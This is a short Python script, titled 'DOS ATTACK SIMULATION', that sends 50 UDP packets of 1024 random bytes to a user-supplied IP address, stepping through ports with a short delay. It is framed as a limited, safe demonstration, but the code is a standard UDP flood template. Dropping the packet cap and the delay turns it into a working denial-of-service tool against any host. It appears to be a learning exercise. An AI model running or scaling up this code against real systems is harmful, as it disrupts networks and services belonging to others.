import socket
import random
import time
from datetime import datetime

# Show current time
now = datetime.now()
print("Time:", now)

# Create UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Generate random data
data = random._urandom(1024)

# Target IP (YOUR WIFI IP)
ip = "10.12.13.00"

# Starting port
port = 1024

print("\n-----------------------------")
print("   DOS ATTACK SIMULATION   ")
print("-----------------------------\n")

print(f"Target IP   : {ip}")
print(f"Start Port  : {port}\n")

print("Starting...\n")

# Send limited packets
count = 0

while count < 50:
    sock.sendto(data, (ip, port))
    count += 1
    print(f"Sent packet {count} to {ip} through port {port}")
    port += 1

    if port == 65535:
        port = 1024

    time.sleep(0.1)

print("\nFinished sending packets safely")